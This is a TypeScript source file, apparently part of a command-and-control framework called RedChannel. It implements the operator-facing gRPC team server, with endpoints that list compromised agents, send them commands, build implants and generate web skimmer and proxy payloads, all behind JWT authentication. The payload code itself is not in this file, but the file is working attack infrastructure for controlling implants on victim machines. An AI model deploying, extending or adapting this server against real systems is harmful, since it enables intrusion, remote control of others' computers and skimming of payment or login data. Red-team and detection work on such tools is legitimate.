import Logger from "../lib/logger";
import RedChannel, { AgentOutputEvent } from "../lib/redchannel";
import { OnSuccessCallback, ServerBase } from "./base";
import * as grpc from "@grpc/grpc-js";
import { EventEmitter } from "node:events";

import jwt, { JwtPayload } from "jsonwebtoken";

import { redChannelDefinition, IRedChannel } from "../pb/c2.grpc-server";
import {
    Agent,
    AgentCommandRequest,
    AgentCommandResponse,
    AgentOutputRequest,
    AgentOutputResponse,
    AuthenticateRequest,
    AuthenticateResponse,
    BuildImplantRequest,
    BuildImplantResponse,
    BuildImplantStreamResponse,
    CommandStatus,
    ForceFetchRequest,
    ForceFetchResponse,
    GenerateProxyPayloadRequest,
    GenerateProxyPayloadResponse,
    GenerateSkimmerPayloadRequest,
    GenerateSkimmerPayloadResponse,
    GetAgentsRequest,
    GetAgentsResponse,
    GetBuildLogResponse,
    GetConfigRequest,
    GetConfigResponse,
    GetStaticDnsRequest,
    GetStaticDnsResponse,
    KeyxRequest,
    KeyxResponse,
    KillAgentRequest,
    KillAgentResponse,
    LogLevel,
    OperatorChatRequest,
    OperatorChatResponse,
    ProxyLoopRequest,
    ProxyLoopResponse,
    SetConfigRequest,
    SetConfigResponse,
    SetStaticDnsRequest,
    SetStaticDnsResponse,
    StaticDnsAction,
    StreamLogRequest,
    StreamLogResponse,
} from "../pb/c2";
import { Config, emsg } from "../utils";
import { AgentCommand } from "../pb/implant";
import { BuildEvent } from "../modules/implant";

export interface TeamServerCerts {
    ca: Buffer | null;
    serverCert: Buffer;
    serverKey: Buffer;
}

export enum ChatEvent {
    MESSAGE = "message",
    CONNECT = "connect",
    DISCONNECT = "disconnect",
}

export type CallServerTypes<I, O> = grpc.ServerUnaryCall<I, O> | grpc.ServerWritableStream<I, O> | grpc.ServerDuplexStream<I, O>;

export default class TeamServer implements ServerBase {
    log: Logger;
    server: grpc.Server;
    service: IRedChannel;
    credentials: grpc.ServerCredentials;
    chatEmitter: EventEmitter;

    constructor(protected redchannel: RedChannel, certs: TeamServerCerts, public port: number, public bindIp: string) {
        this.log = this.redchannel.log ?? new Logger();
        this.server = new grpc.Server();
        this.credentials = grpc.ServerCredentials.createSsl(
            certs.ca,
            [
                {
                    cert_chain: certs.serverCert,
                    private_key: certs.serverKey,
                },
            ],
            false
        );
        this.chatEmitter = new EventEmitter({});

        this.service = {
            authenticate: this.authenticate.bind(this),

            operatorChat: this.operatorChat.bind(this),

            agentOutput: this.agentOutput.bind(this),
            agentOutputStream: this.agentOutputStream.bind(this),

            getAgents: this.getAgents.bind(this),
            keyx: this.keyx.bind(this),
            agentCommand: this.agentCommand.bind(this),
            killAgent: this.killAgent.bind(this),

            buildImplant: this.buildImplant.bind(this),
            buildImplantStream: this.buildImplantStream.bind(this),
            getBuildLog: this.getBuildLog.bind(this),

            getConfig: this.getConfig.bind(this),
            setConfig: this.setConfig.bind(this),

            streamLog: this.streamLog.bind(this),

            generateSkimmerPayload: this.generateSkimmerPayload.bind(this),

            setStaticDns: this.setStaticDns.bind(this),
            getStaticDns: this.getStaticDns.bind(this),

            proxyLoop: this.proxyLoop.bind(this),
            generateProxyPayload: this.generateProxyPayload.bind(this),
            forceFetch: this.forceFetch.bind(this),
        };
    }

    start(onSuccess: OnSuccessCallback) {
        this.server.addService(redChannelDefinition, this.service);
        this.server.bindAsync(`${this.bindIp}:${this.port}`, grpc.ServerCredentials.createInsecure(), (err: Error | null) => {
            if (err) {
                this.log.error(`grpc error: ${err.message}`);
            } else {
                this.server.start();
                onSuccess();
            }
        });
    }

    getCallSourceIps<I, O>(call: CallServerTypes<I, O>): string[] {
        const headersMap = call.metadata.getMap();
        const sourceIps: string[] = [call.getPeer()];
        if (headersMap["x-forwarded-for"]) sourceIps.push(headersMap["x-forwarded-for"] as string);

        return sourceIps;
    }

    checkAuth<I, O>(call: CallServerTypes<I, O>): boolean {
        const headersMap = call.metadata.getMap();
        const sourceIps = this.getCallSourceIps<I, O>(call);

        const authHeader = headersMap.authorization as string;
        if (!authHeader?.length) {
            this.log.error(`auth error from client ${sourceIps}, missing authorization header`);
            return false;
        }
        const headerSplit = authHeader.split(" ");
        if (headerSplit.length < 2) {
            this.log.error(`auth error from client ${sourceIps}, invalid authorization header`);
            return false;
        }

        const token = headerSplit[1];

        let authenticated: string | JwtPayload;
        try {
            authenticated = jwt.verify(token, this.redchannel.hashedPassword, {
                algorithms: ["HS256"],
            });
        } catch (e) {
            this.log.error(`auth error from client ${sourceIps}, token did not verify: ${emsg(e)}`);
            return false;
        }

        const operator = authenticated["operator"];
        if (!authenticated || operator === undefined) {
            this.log.error(`auth error from client ${sourceIps}, token verified but has invalid data`);
            return false;
        }

        call.metadata.add("operator", operator);
        return true;
    }

    authenticate(call: grpc.ServerUnaryCall<AuthenticateRequest, AuthenticateResponse>, callback: grpc.sendUnaryData<AuthenticateResponse>): void {
        call.on("error", (error) => {
            this.log.error(`authenticate() error: ${error}`);
            throw new Error("Server error");
        });

        const responseProto = AuthenticateResponse.create({});

        const sourceIps = this.getCallSourceIps<AuthenticateRequest, AuthenticateResponse>(call);

        const operator = call.request.operator;
        const passwordHash = call.request.password;
        if (!this.redchannel.verifyOperator(operator, passwordHash)) {
            responseProto.message = "invalid credentials";
            responseProto.status = CommandStatus.ERROR;
            callback(null, responseProto);

            this.log.error(`auth error from client ${sourceIps}, operator did not verify: ${operator}/*`);
            return;
        }

        const token = jwt.sign({ operator: operator }, this.redchannel.hashedPassword, {
            expiresIn: Config.AUTH_TOKEN_VALIDITY_PERIOD,
            notBefore: 0,
            algorithm: "HS256",
        });

        responseProto.status = CommandStatus.SUCCESS;
        responseProto.token = token;

        this.log.info(`operator ${operator} authenticate from: ${sourceIps}`);
        callback(null, responseProto);
    }

    operatorChat(call: grpc.ServerDuplexStream<OperatorChatRequest, OperatorChatResponse>): void {
        if (!this.checkAuth<OperatorChatRequest, OperatorChatResponse>(call)) {
            call.write(OperatorChatResponse.create({ status: CommandStatus.ERROR, message: "Authentication failed." }));
            call.end();
            return;
        }

        const incomingMessage = (message) => {
            call.write(
                OperatorChatResponse.create({
                    status: CommandStatus.SUCCESS,
                    message: message,
                })
            );
        };
        this.chatEmitter.addListener(ChatEvent.MESSAGE, incomingMessage);

        const operator = call.metadata.get("operator");
        const message = `* ${operator} connected to chat.`;
        this.log.info(message);
        this.chatEmitter.emit(ChatEvent.MESSAGE, message);

        call.on("data", (data) => {
            if (!data.message?.length) {
                call.write(
                    OperatorChatResponse.create({
                        status: CommandStatus.ERROR,
                        message: "say something...",
                    })
                );
                return;
            }

            const chatProto = OperatorChatRequest.fromJson(data);
            this.chatEmitter.emit(ChatEvent.MESSAGE, `<${operator}> ${chatProto.message}`);
        });
        call.on("error", (error) => {
            this.chatEmitter.removeListener(ChatEvent.MESSAGE, incomingMessage);
            this.log.error(`operatorChat() error: ${error.message}`);
        });

        const onEnd = () => {
            this.chatEmitter.removeListener(ChatEvent.MESSAGE, incomingMessage);
            if (operator) {
                const message = `* ${operator} disconnected from chat`;
                this.log.info(message);
                this.chatEmitter.emit(ChatEvent.MESSAGE, message);
            }
        };
        call.on("close", onEnd);
        call.on("finish", onEnd);
        call.on("end", onEnd);
    }

    getAgents(call: grpc.ServerUnaryCall<GetAgentsRequest, GetAgentsResponse>, callback: grpc.sendUnaryData<GetAgentsResponse>): void {
        if (!this.checkAuth<GetAgentsRequest, GetAgentsResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`getAgents() error: ${error}`);
            throw new Error("Server error");
        });
        // const c2CommandProto = c2.C2CommandRequest.decode(data);
        const agents = this.redchannel.getAgents();
        const agentList: Agent[] = [];

        agents.forEach((agent) => {
            agentList.push(
                Agent.create({
                    agentId: agent.id,
                    lastseen: Math.floor(agent.lastseen || 0),
                    hasPubkey: agent.pubkey ? true : false,
                    ip: [agent.ip || ""],
                    sendqSize: agent.sendq.length,
                    recvqSize: agent.recvq.size,
                    sysinfo: agent.sysinfo,
                })
            );
        });

        const responseProto = GetAgentsResponse.create({
            agents: agentList,
            status: CommandStatus.SUCCESS,
        });
        callback(null, responseProto);
    }

    killAgent(call: grpc.ServerUnaryCall<KillAgentRequest, KillAgentResponse>, callback: grpc.sendUnaryData<KillAgentResponse>): void {
        if (!this.checkAuth<KillAgentRequest, KillAgentResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`killAgent() error: ${error}`);
            throw new Error("Server error");
        });

        const responseProto = KillAgentResponse.create({
            status: CommandStatus.SUCCESS,
        });
        const agentId = call.request.agentId;
        try {
            this.redchannel.killAgent(agentId);
            this.log.warn(`${call.metadata.get("operator")} killed agent(${agentId}), agent may reconnect`);
        } catch (e: unknown) {
            responseProto.status = CommandStatus.ERROR;
            responseProto.message = emsg(e);
        }
        callback(null, responseProto);
    }

    keyx(call: grpc.ServerUnaryCall<KeyxRequest, KeyxResponse>, callback: grpc.sendUnaryData<KeyxResponse>): void {
        if (!this.checkAuth<KeyxRequest, KeyxResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`keyx() error: ${error}`);
            throw new Error("Server error");
        });

        const agentId = call.request.agentId;
        if (!agentId) {
            this.redchannel.broadcastKeyx();
        } else {
            this.redchannel.sendCommandKeyx(agentId);
        }

        const responseProto = KeyxResponse.create({
            status: CommandStatus.SUCCESS,
        });
        callback(null, responseProto);
    }

    buildExecute(buildRequest: BuildImplantRequest): BuildImplantResponse {
        const implantModule = this.redchannel.modules.implant;

        implantModule.buildParameters = { ...buildRequest };

        const responseProto = BuildImplantResponse.create({
            status: CommandStatus.SUCCESS,
        });
        try {
            implantModule.execute();
            responseProto.outputFile = implantModule.outputFile;
        } catch (e: unknown) {
            responseProto.status = CommandStatus.ERROR;
            responseProto.message = emsg(e);
        }
        return responseProto;
    }

    buildImplant(call: grpc.ServerUnaryCall<BuildImplantRequest, BuildImplantResponse>, callback: grpc.sendUnaryData<BuildImplantResponse>): void {
        if (!this.checkAuth<BuildImplantRequest, BuildImplantResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`buildImplant() error: ${error}`);
            throw new Error("Server error");
        });

        const responseProto = this.buildExecute(call.request);
        callback(null, responseProto);
    }

    agentOutputStream(call: grpc.ServerWritableStream<AgentOutputRequest, AgentOutputResponse>): void {
        if (!this.checkAuth<AgentOutputRequest, AgentOutputResponse>(call)) throw new Error("Authentication failed");

        const agentIdRequested = call.request.agentId;

        // we don't check if the agent exists, as it may come online later
        // and we want to catch any output
        if (!agentIdRequested?.length) {
            call.write(
                AgentOutputResponse.create({
                    status: CommandStatus.ERROR,
                    message: [`invalid agent id: ${agentIdRequested}`],
                })
            );
            call.end();
            return;
        }

        const stdOutCallback = (agentId, entry: string) => {
            if (agentId !== agentIdRequested) return;

            call.write(
                AgentOutputResponse.create({
                    status: CommandStatus.SUCCESS,
                    message: [entry],
                })
            );
        };
        const stdErrCallback = (agentId, entry: string) => {
            if (agentId !== agentIdRequested) return;

            call.write(
                AgentOutputResponse.create({
                    status: CommandStatus.ERROR,
                    message: [entry],
                })
            );
        };

        this.redchannel.agentOutputEmitter.addListener(AgentOutputEvent.AGENT_OUTPUT, stdOutCallback);
        this.redchannel.agentOutputEmitter.addListener(AgentOutputEvent.AGENT_OUTPUT_ERROR, stdErrCallback);

        this.log.info(`streaming agent (${agentIdRequested}) output to ${call.metadata.get("operator")}`);

        const removeListeners = () => {
            this.redchannel.agentOutputEmitter.removeListener(AgentOutputEvent.AGENT_OUTPUT, stdOutCallback);
            this.redchannel.agentOutputEmitter.removeListener(AgentOutputEvent.AGENT_OUTPUT_ERROR, stdErrCallback);
        };
        call.on("error", (error) => {
            removeListeners();

            this.log.error(`agentOutputStream() error: ${error}`);
            throw new Error("Server error");
        });
        call.on("close", removeListeners);
        call.on("finish", removeListeners);
    }

    agentOutput(call: grpc.ServerUnaryCall<AgentOutputRequest, AgentOutputResponse>, callback: grpc.sendUnaryData<AgentOutputResponse>): void {
        if (!this.checkAuth<AgentOutputRequest, AgentOutputResponse>(call)) throw new Error("Authentication failed");

        const agent = this.redchannel.agents.get(call.request.agentId);
        if (!agent) {
            const responseProto = AgentOutputResponse.create({
                status: CommandStatus.ERROR,
                message: [`unknown agent with id: ${call.request.agentId}`],
            });
            callback(null, responseProto);
            return;
        }

        call.on("error", (error) => {
            this.log.error(`agentOutput() error: ${error}`);
            throw new Error("Server error");
        });

        const responseProto = AgentOutputResponse.create({
            status: CommandStatus.SUCCESS,
            message: agent.output,
        });

        callback(null, responseProto);
    }

    buildImplantStream(call: grpc.ServerWritableStream<BuildImplantRequest, BuildImplantStreamResponse>): void {
        if (!this.checkAuth<BuildImplantRequest, BuildImplantStreamResponse>(call)) throw new Error("Authentication failed");

        const stdOutCallback = (entry: string) => {
            call.write(
                BuildImplantStreamResponse.create({
                    level: LogLevel.INFO,
                    message: entry,
                })
            );
        };
        const stdErrCallback = (entry: string) => {
            call.write(
                BuildImplantStreamResponse.create({
                    level: LogLevel.ERROR,
                    message: entry,
                })
            );
        };
        const buildEndCallback = () => {
            call.end();
        };

        this.redchannel.modules.implant.eventEmitter.addListener(BuildEvent.BUILD_STDOUT, stdOutCallback);
        this.redchannel.modules.implant.eventEmitter.addListener(BuildEvent.BUILD_STDERR, stdErrCallback);
        this.redchannel.modules.implant.eventEmitter.addListener(BuildEvent.BUILD_END, buildEndCallback);

        this.log.info(`streaming implant build logs to ${call.metadata.get("operator")}`);

        this.buildExecute(call.request);

        const removeListeners = () => {
            this.redchannel.modules.implant.eventEmitter.removeListener(BuildEvent.BUILD_STDOUT, stdOutCallback);
            this.redchannel.modules.implant.eventEmitter.removeListener(BuildEvent.BUILD_STDERR, stdErrCallback);
            this.redchannel.modules.implant.eventEmitter.removeListener(BuildEvent.BUILD_END, buildEndCallback);
        };
        call.on("error", (error) => {
            removeListeners();

            this.log.error(`buildImplantStream() error: ${error}`);
            throw new Error("Server error");
        });
        call.on("close", removeListeners);
        call.on("finish", removeListeners);
    }

    getBuildLog(call: grpc.ServerUnaryCall<GetAgentsRequest, GetAgentsResponse>, callback: grpc.sendUnaryData<GetBuildLogResponse>): void {
        if (!this.checkAuth<GetAgentsRequest, GetAgentsResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`getBuildLog() error: ${error}`);
            throw new Error("Server error");
        });

        const responseProto = GetBuildLogResponse.create({
            status: CommandStatus.SUCCESS,
            log: "",
        });

        const implantModule = this.redchannel.modules.implant;
        try {
            responseProto.log = implantModule.getLog();
        } catch (e: unknown) {
            responseProto.status = CommandStatus.ERROR;
            responseProto.message = emsg(e);
        }
        callback(null, responseProto);
    }

    agentCommand(call: grpc.ServerUnaryCall<AgentCommandRequest, AgentCommandResponse>, callback: grpc.sendUnaryData<AgentCommandResponse>): void {
        if (!this.checkAuth<AgentCommandRequest, AgentCommandResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`agentCommand() error: ${error}`);
            throw new Error("Server error");
        });

        const responseProto = AgentCommandResponse.create({
            status: CommandStatus.SUCCESS,
        });

        const agentId = call.request.agentId;
        const commandParameters = call.request.parameters;
        const agentCommand = call.request.command;
        const commandImplantConfig = call.request.implantConfig;
        try {
            this.redchannel.sendAgentCommand(agentId, agentCommand, commandParameters, commandImplantConfig);
            this.log.warn(`${call.metadata.get("operator")} sent agent(${agentId}) command ${AgentCommand[agentCommand]}`);
        } catch (e: unknown) {
            responseProto.status = CommandStatus.ERROR;
            responseProto.message = emsg(e);
        }
        callback(null, responseProto);
    }

    getConfig(call: grpc.ServerUnaryCall<GetConfigRequest, GetConfigResponse>, callback: grpc.sendUnaryData<GetConfigResponse>): void {
        if (!this.checkAuth<GetConfigRequest, GetConfigResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`getConfig() error: ${error}`);
            throw new Error("Server error");
        });

        // cleanup sensitive information
        const sanitizedConfig = this.redchannel.config;
        if (sanitizedConfig.c2) sanitizedConfig.c2.operators = {};

        const responseProto = GetConfigResponse.create({
            status: CommandStatus.SUCCESS,
            config: sanitizedConfig,
        });
        callback(null, responseProto);
    }

    setConfig(call: grpc.ServerUnaryCall<SetConfigRequest, SetConfigResponse>, callback: grpc.sendUnaryData<SetConfigResponse>): void {
        if (!this.checkAuth<SetConfigRequest, SetConfigResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`setConfig() error: ${error}`);
            throw new Error("Server error");
        });

        const newConfig = call.request.config;
        if (!newConfig) {
            callback(
                null,
                SetConfigResponse.create({
                    status: CommandStatus.ERROR,
                    message: "invalid config",
                })
            );
            return;
        }

        const responseProto = SetConfigResponse.create({
            status: CommandStatus.SUCCESS,
        });

        const updatedEntries: string[] = [];
        for (const module in newConfig) {
            if (Object.prototype.hasOwnProperty.call(this.redchannel.config, module)) {
                for (const property in newConfig[module]) {
                    if (Object.prototype.hasOwnProperty.call(this.redchannel.config[module], property)) {
                        this.redchannel.config[module][property] = newConfig[module][property].value;
                        updatedEntries.push(`${module}.${property} = ${newConfig[module][property].value}`);
                    }
                }
            }
        }

        // if the debug property changes, reset the log level as well to show debug messages in the console
        this.redchannel.resetLogLevel();

        this.log.warn(`${call.metadata.get("operator")} updated ${updatedEntries.length} entries in c2 config:`, updatedEntries);
        callback(null, responseProto);
    }

    streamLog(call: grpc.ServerWritableStream<StreamLogRequest, StreamLogResponse>): void {
        if (!this.checkAuth<StreamLogRequest, StreamLogResponse>(call)) throw new Error("Authentication failed");

        const requestedLogLevel = call.request.level;

        const streamLogCallback = (level: LogLevel, ...msg) => {
            if (level >= requestedLogLevel) {
                const message = msg.map((entry) => {
                    if (typeof entry === "object") return JSON.stringify(entry);
                    return entry;
                });
                call.write(
                    StreamLogResponse.create({
                        level: level,
                        message: message.join(" "),
                    })
                );
            }
        };

        const eventName = "log";
        this.redchannel.log.eventEmitter.addListener(eventName, streamLogCallback);
        this.log.info(`streaming logs to ${call.metadata.get("operator")}`);

        call.on("error", (error) => {
            this.redchannel.log.eventEmitter.removeListener(eventName, streamLogCallback);
            this.log.error(`streamLog() error: ${error}`);
            throw new Error("Server error");
        });
        call.on("close", () => {
            this.redchannel.log.eventEmitter.removeListener(eventName, streamLogCallback);
        });
        call.on("finish", () => {
            this.redchannel.log.eventEmitter.removeListener(eventName, streamLogCallback);
        });
    }

    proxyLoop(call: grpc.ServerUnaryCall<ProxyLoopRequest, ProxyLoopResponse>, callback: grpc.sendUnaryData<ProxyLoopResponse>): void {
        if (!this.checkAuth<ProxyLoopRequest, ProxyLoopResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`proxyLoop() error: ${error}`);
            throw new Error("Server error");
        });

        const proxyModule = this.redchannel.modules.proxy;
        const responseProto = ProxyLoopResponse.create({
            status: CommandStatus.SUCCESS,
        });
        try {
            if (this.redchannel.config.proxy) this.redchannel.config.proxy.enabled = call.request.start;
            proxyModule.proxyFetchLoop();
        } catch (e: unknown) {
            responseProto.status = CommandStatus.ERROR;
            responseProto.message = emsg(e);
        }
        callback(null, responseProto);
    }

    forceFetch(call: grpc.ServerUnaryCall<ForceFetchRequest, ForceFetchResponse>, callback: grpc.sendUnaryData<ForceFetchResponse>): void {
        if (!this.checkAuth<ForceFetchRequest, ForceFetchResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`forceFetch() error: ${error}`);
            throw new Error("Server error");
        });

        const proxyModule = this.redchannel.modules.proxy;
        const responseProto = ForceFetchResponse.create({
            status: CommandStatus.SUCCESS,
        });
        try {
            proxyModule.proxyFetch();
        } catch (e: unknown) {
            responseProto.status = CommandStatus.ERROR;
            responseProto.message = emsg(e);
        }
        callback(null, responseProto);
    }

    generateProxyPayload(call: grpc.ServerUnaryCall<GenerateProxyPayloadRequest, GenerateProxyPayloadResponse>, callback: grpc.sendUnaryData<GenerateProxyPayloadResponse>): void {
        if (!this.checkAuth<GenerateProxyPayloadRequest, GenerateProxyPayloadResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`generateProxyPayload() error: ${error}`);
            throw new Error("Server error");
        });

        const responseProto = GenerateProxyPayloadResponse.create({
            status: CommandStatus.SUCCESS,
        });

        const proxyModule = this.redchannel.modules.proxy;
        try {
            proxyModule.execute();
            responseProto.payload = proxyModule.payload;
        } catch (e: unknown) {
            responseProto.status = CommandStatus.ERROR;
            responseProto.message = emsg(e);
        }
        callback(null, responseProto);
    }

    generateSkimmerPayload(call: grpc.ServerUnaryCall<GenerateSkimmerPayloadRequest, GenerateSkimmerPayloadResponse>, callback: grpc.sendUnaryData<GenerateSkimmerPayloadResponse>): void {
        if (!this.checkAuth<GenerateSkimmerPayloadRequest, GenerateSkimmerPayloadResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`generateSkimmerPayload() error: ${error}`);
            throw new Error("Server error");
        });

        const responseProto = GenerateSkimmerPayloadResponse.create({
            status: CommandStatus.SUCCESS,
        });

        const skimmerModule = this.redchannel.modules.skimmer;
        try {
            skimmerModule.execute();
            responseProto.payload = skimmerModule.payload;
        } catch (e: unknown) {
            responseProto.status = CommandStatus.ERROR;
            responseProto.message = emsg(e);
        }
        callback(null, responseProto);
    }

    setStaticDns(call: grpc.ServerUnaryCall<SetStaticDnsRequest, SetStaticDnsResponse>, callback: grpc.sendUnaryData<SetStaticDnsResponse>): void {
        if (!this.checkAuth<SetStaticDnsRequest, SetStaticDnsResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`setStaticDns() error: ${error}`);
            throw new Error("Server error");
        });

        const responseProto = SetStaticDnsResponse.create({
            status: CommandStatus.SUCCESS,
        });

        const staticDnsModule = this.redchannel.modules.static_dns;

        const action = call.request.action;
        const hostname = call.request.hostname;
        const ip = call.request.ip;

        try {
            switch (action) {
                case StaticDnsAction.ADD:
                case StaticDnsAction.MODIFY:
                    staticDnsModule.add(hostname, ip);
                    break;
                case StaticDnsAction.DELETE:
                    staticDnsModule.delete(hostname);
                    break;
            }
        } catch (e: unknown) {
            responseProto.status = CommandStatus.ERROR;
            responseProto.message = emsg(e);
        }
        callback(null, responseProto);
    }

    getStaticDns(call: grpc.ServerUnaryCall<GetStaticDnsRequest, GetStaticDnsResponse>, callback: grpc.sendUnaryData<GetStaticDnsResponse>): void {
        if (!this.checkAuth<GetStaticDnsRequest, GetStaticDnsResponse>(call)) throw new Error("Authentication failed");

        call.on("error", (error) => {
            this.log.error(`getConfig() error: ${error}`);
            throw new Error("Server error");
        });

        // cleanup sensitive information
        const staticDnsRecords = JSON.stringify(this.redchannel.config.staticDns);

        const responseProto = GetStaticDnsResponse.create({
            status: CommandStatus.SUCCESS,
            message: staticDnsRecords,
        });
        callback(null, responseProto);
    }
}
